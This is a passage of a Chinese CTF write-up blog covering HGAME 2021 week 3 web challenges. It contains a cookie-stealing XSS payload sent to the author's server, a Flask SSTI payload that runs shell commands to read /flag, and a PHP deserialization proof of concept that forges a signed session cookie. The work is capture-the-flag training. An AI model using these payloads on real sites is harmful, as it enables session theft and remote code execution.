+<p>“)eikooc.tnemucod+’/1908:spv//‘(nepo.wodniw”=rorreno ‘x’=crs gmi&lt;on<br>反过来也就是<br>no&lt;img src=’x’ //vps:8091/‘+document.cookie)”&gt;<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">获取`token`</span><br></pre></td></tr></table></figure></p>
+</blockquote>
+<p>GET /token=f7c30a3a5d9263d8c44476259ff7873764a1be04a9a45df8f92ae6b77b155acf HTTP/1.1<br>Host: url:8091<br>Connection: keep-alive<br>Upgrade-Insecure-Requests: 1<br>User-Agent: “WaterFox”<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,<em>/</em>;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Referer: <a href="http://159.75.113.183:7654/checker?contents[]=on%3Cimg%20src%3D%27x%27%20onerror%3D%22window.open%28%27//url%3A8091/%27%2Bdocument.cookie%29%22%3E&amp;contents[]=on%3Cimg%20src%3D%27x%27%20onerror%3D%22window.open%28%27//url%3A8091/%27%2Bdocument.cookie%29%22%3E&amp;contents[]=on%3Cimg%20src%3D%27x%27%20onerror%3D%22window.open%28%27//url%3A8091/%27%2Bdocument.cookie%29%22%3E&amp;" target="_blank" rel="noopener">http://159.75.113.183:7654/checker?contents[]=on%3Cimg%20src%3D%27x%27%20onerror%3D%22window.open%28%27//url%3A8091/%27%2Bdocument.cookie%29%22%3E&amp;contents[]=on%3Cimg%20src%3D%27x%27%20onerror%3D%22window.open%28%27//url%3A8091/%27%2Bdocument.cookie%29%22%3E&amp;contents[]=on%3Cimg%20src%3D%27x%27%20onerror%3D%22window.open%28%27//url%3A8091/%27%2Bdocument.cookie%29%22%3E&amp;</a><br>Accept-Encoding: gzip, deflate<br>Accept-Language: en-US<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">使用`token`访问`/flag`获取</span><br></pre></td></tr></table></figure></p>
+<p>GET /flag HTTP/1.1<br>Host: zuckonit.0727.site:7654<br>Cookie: token=f7c30a3a5d9263d8c44476259ff7873764a1be04a9a45df8f92ae6b77b155acf; session=a72bdd50-c3e4-4c0f-b6fd-9e578824ca75<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&gt; hgame&#123;X5s_t0_GEt_@dm1n&apos;s_cOokies.&#125;</span><br><span class="line"></span><br><span class="line">### week3-Forgetful</span><br><span class="line"></span><br><span class="line">------</span><br><span class="line"></span><br><span class="line">注册登录进去以后有个`todolist`功能，通关添加标题提交后可预览。插入之前的`script`语句发现有回显</span><br></pre></td></tr></table></figure></p>
+<p>&lt;img src=’x’ //url:8091’+document.cookie)”&gt;<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">结合题意可知应该是`python-ssti`</span><br><span class="line">尝试</span><br></pre></td></tr></table></figure></p>
+<p>Hello 49<br>返回<br>当前Todo: Hello 49<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;!--&#123;&#123;&apos;&apos;.__class__.__bases__[0].__subclasses__()&#125;&#125;--&gt;</span><br><span class="line">回显基类</span><br><span class="line"></span><br><span class="line">参考链接[Flask-SSTI注意事项以及一些POC](https://www.cnblogs.com/ersuani/p/13896311.html)</span><br><span class="line">最终构成</span><br><span class="line"></span><br><span class="line">&lt;!--&#123;% for c in &apos;&apos;.__class__.__bases__[0].__subclasses__() %&#125;&#123;% if c.__name__==&apos;catch_warnings&apos; %&#125;&#123;&#123; c.__init__.__globals__[&apos;__builtins__&apos;].eval(&quot;__import__(&apos;os&apos;).popen(&apos;cat /flag&apos;).read()&quot;) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;--&gt;</span><br><span class="line"></span><br><span class="line">但是此时返回</span><br></pre></td></tr></table></figure></p>
+<p>Stop!!!<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">尝试逆向`tac`也会返回`stop`，尝试`nc`到服务器也没反应，最终编码输出</span><br><span class="line"></span><br><span class="line">&lt;!--&#123;% for c in &apos;&apos;.__class__.__bases__[0].__subclasses__() %&#125;&#123;% if c.__name__==&apos;catch_warnings&apos; %&#125;&#123;&#123; c.__init__.__globals__[&apos;__builtins__&apos;].eval(&quot;__import__(&apos;os&apos;).popen(&apos;cat /flag | base64&apos;).read()&quot;) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;--&gt;</span><br><span class="line"></span><br><span class="line">`aGdhbWV7aDB3XzRib3U3K0wzYXJuIW5nflB5dGhPbl5Ob3c/fQo=`</span><br><span class="line"></span><br><span class="line">&gt; hgame&#123;h0w_4bou7+L3arn!ng~PythOn^Now?&#125;</span><br><span class="line"></span><br><span class="line">### week3-Arknights</span><br><span class="line"></span><br><span class="line">------</span><br><span class="line"></span><br><span class="line">题目有`git`泄露源码</span><br></pre></td></tr></table></figure></p>
+<p>├── index.php<br>├── pool.php–数据池<br>├── simulator.php–主要处理文件<br>├── static<br>│   ├── css<br>│   │   ├── bootstrap.min.css<br>│   │   └── cover.css<br>│   └── img<br>│       └── bg.jpg<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">分析重要文件`simulator.php`代码如下</span><br></pre></td></tr></table></figure></p>
+<p>&lt;?php<br>class CardsPool<br>{</p>
+<pre><code>private $file = &apos;&apos;;
+
+public function __construct($filePath)
+{
+    if (file_exists($filePath)) {
+        $this-&gt;file = $filePath;
+    } else {
+        die(&quot;Cards pool file doesn&apos;t exist!&quot;);
+    }
+}
+
+public function __toString(){
+    return file_get_contents($this-&gt;file);
+}
+</code></pre><p>}<br>class Eeeeeeevallllllll{<br>    public $msg=”坏坏liki到此一游”;</p>
+<pre><code>public function __destruct()
+{
+    echo $this-&gt;msg;
+}
+</code></pre><p>}<br>class Session{</p>
+<pre><code>private $sessionData;
+
+const SECRET_KEY = &quot;7tH1PKviC9ncELTA1fPysf6NYq7z7IA9&quot;;
+
+public function __construct(){}
+
+public function set($key, $value){
+    if(empty($key)){
+        $this-&gt;sessionData[] = $value;
+    }else{
+        $this-&gt;sessionData[$key] = $value;
+    }
+}
+
+public function getAll(){
+    return $this-&gt;sessionData;
+}
+
+
+public function save(){
+
+    $serialized = serialize($this-&gt;sessionData);
+    $sign = base64_encode(md5($serialized . self::SECRET_KEY));
+    $value = base64_encode($serialized) . &quot;.&quot; . $sign;
+    setcookie(&quot;session&quot;,$value);
+}
+
+
+public function extract($session){
+
+    $sess_array = explode(&quot;.&quot;, $session);
+    $data = base64_decode($sess_array[0]);
+    $sign = base64_decode($sess_array[1]);
+
+    if($sign === md5($data . self::SECRET_KEY)){
+        $this-&gt;sessionData = unserialize($data);
+    }else{
+        unset($this-&gt;sessionData);
+        die(&quot;Go away! You hacker!&quot;);
+    }
+}
+</code></pre><p>}<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">此处可以看到，我们的可控字段`session`的加解密流程，通过构造Eeeeeeevallllllll类，使`__destruct方法里的echo`触发`CardsPool`类的`__toString`方法，形成文件读，从而获取`flag`，且`SECRET_KEY`也已经给了。</span><br><span class="line">参考链接</span><br><span class="line"></span><br><span class="line">[PHP反序列化漏洞总结](https://blog.csdn.net/weixin_43415644/article/details/94590443)</span><br><span class="line">最后构成`poc`如下</span><br></pre></td></tr></table></figure></p>
+<p>&lt;?php<br>class CardsPool<br>{</p>
+<pre><code>private $file = &apos;&apos;;
+
+public function __construct($filePath)
+{
+    if (file_exists($filePath)) {
+        $this-&gt;file = $filePath;
+    } else {
+        die(&quot;Cards pool file doesn&apos;t exist!&quot;);
+    }
+}
+
+public function __toString(){
+    return file_get_contents($this-&gt;file);
+}
+</code></pre><p>}<br>class Eeeeeeevallllllll{<br>    public $msg=”坏坏liki到此一游”;</p>
+<pre><code>public function __destruct()
+{
+    echo $this-&gt;msg;
+}
+</code></pre><p>}</p>
+<p>$SECRET_KEY = “7tH1PKviC9ncELTA1fPysf6NYq7z7IA9”;<br>$a = new Eeeeeeevallllllll();<br>$b = new CardsPool(‘./flag.php’);<br>$a-&gt;msg = $b;<br>$serialized = serialize($a);<br>$sign = base64_encode(md5($serialized . $SECRET_KEY));<br>$value = base64_encode($serialized) . “.” . $sign;<br>echo $value;<br>?&gt;<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">返回`payload`</span><br></pre></td></tr></table></figure></p>
+<p>TzoxNzoiRWVlZWVlZXZhbGxsbGxsbGwiOjE6e3M6MzoibXNnIjtPOjk6IkNhcmRzUG9vbCI6MTp7czoxNToiAENhcmRzUG9vbABmaWxlIjtzOjEwOiIuL2ZsYWcucGhwIjt9fQ==.NjhlZTBkNGQyMTM4ZjNmYWU3ZDI2Y2QzYWQ1OTFkZWQ=<br><code>`</code></p>
+<p><code>payload</code>更改<code>cookie</code>获得</p>
+<blockquote>
+<p>hgame{XI-4Nd-n!AN-D0e5Nt_eX|5T~4t_ALL}</p>
+</blockquote>
+
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+      <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束 <i class="fa fa-heart"></i> 感谢阅读-------------</div>
+
+    
+
+    
+
+    
+      
+    
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/ctf/" rel="tag">📖ctf</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2021/01/21/starctf-2021/" rel="next" title="starctf-2021-review">
+                <i class="fa fa-chevron-left"></i> starctf-2021-review
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+  </div>
+
+
+          </div>
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">ZO1RO</p>
+              <div class="site-description motion-element" itemprop="description">永远做好最坏的打算</div>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives/">
+                
+                    <span class="site-state-item-count">19</span>
+                    <span class="site-state-item-name">posts</span>
+                  </a>
+                </div>
+              
+
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-tags">
+                  
+                    
+                      <a href="/tags/">
+                    
+                  
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">4</span>
+                    <span class="site-state-item-name">tags</span>
+                  </a>
+                </div>
+              
+            </nav>
+          
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+
+          
+            <div class="links-of-author motion-element">
+              
+                <span class="links-of-author-item">
+                  
+                  
+                    
+                  
+                  
+                    
+                  
+                  <a href="https://github.com/ZO1RO" title="GitHub &rarr; https://github.com/ZO1RO" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+                </span>
+              
+                <span class="links-of-author-item">
+                  
+                  
+                    
+                  
+                  
+                    
+                  
+                  <a href="mailto:em8xcm93ZWJAMTYzLmNvbQo=" title="E-Mail &rarr; mailto:em8xcm93ZWJAMTYzLmNvbQo=" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                </span>
+              
+            </div>
+          
+
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://impakho.com/" title="https://impakho.com/" rel="noopener" target="_blank">偶像pakho师傅</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://imlonghao.com/" title="https://imlonghao.com/" rel="noopener" target="_blank">偶像longhao师傅</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://wulidecade.cn/" title="https://wulidecade.cn/" rel="noopener" target="_blank">Decade</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://mang0.me/" title="http://mang0.me/" rel="noopener" target="_blank">Mang0</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://blog.singll.cc/" title="https://blog.singll.cc/" rel="noopener" target="_blank">Singll</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://sherlocz.github.io/" title="https://sherlocz.github.io/" rel="noopener" target="_blank">sher10ck</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://timeshu.github.io/" title="https://timeshu.github.io/" rel="noopener" target="_blank">Time</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://ama666.cn/" title="https://ama666.cn/" rel="noopener" target="_blank">ama666</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://jgeek.cn/" title="https://jgeek.cn/" rel="noopener" target="_blank">\0x584A</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+            
+          
+          
+
+        </div>
+      </div>
+
+      
+      <!--noindex-->
+        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+            
+            
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#week1-智商检测鸡"><span class="nav-number">1.</span> <span class="nav-text">week1-智商检测鸡</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#week1-Hitchhiking-in-the-Galaxy"><span class="nav-number">2.</span> <span class="nav-text">week1-Hitchhiking_in_the_Galaxy</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#week2-Liki的生日礼物"><span class="nav-number">3.</span> <span class="nav-text">week2-Liki的生日礼物</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#week2-LazyDogR4U"><span class="nav-number">4.</span> <span class="nav-text">week2-LazyDogR4U</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#week2-200OK"><span class="nav-number">5.</span> <span class="nav-text">week2-200OK!!</span></a></li></ol></div>
+            
+
+          </div>
+        </div>
+      <!--/noindex-->
+      
+
+      
+        <div class="back-to-top">
+          <i class="fa fa-arrow-up"></i>
+          
+            <span id="scrollpercent"><span>0</span>%</span>
+          
+        </div>
+      
+
+    </div>
+  </aside>
+  
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2021</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">ZO1RO</span>
+
+  
+
+  
+</div>
+
+
+
+
+
+
+
+
+
+        
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+
+    
+
+    
+
+    
+  </div>
+
+  
+
+<script>
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+
+  
+
+
+  <script src="/js/utils.js?v=7.1.1"></script>
+
+  <script src="/js/motion.js?v=7.1.1"></script>
+
+
+
+  
+  
+
+
+  <script src="/js/schemes/muse.js?v=7.1.1"></script>
+
+
+
+  
+  <script src="/js/scrollspy.js?v=7.1.1"></script>
+<script src="/js/post-details.js?v=7.1.1"></script>
+
+
+
+  
+
+
+  <script src="/js/next-boot.js?v=7.1.1"></script>
+
+
+  
+
+  
+
+  
+
+  
+
+
+  
+
+
+  
+  <script>
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url).replace(/\/{2,}/g, '/');
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x"></i></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x"></i></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
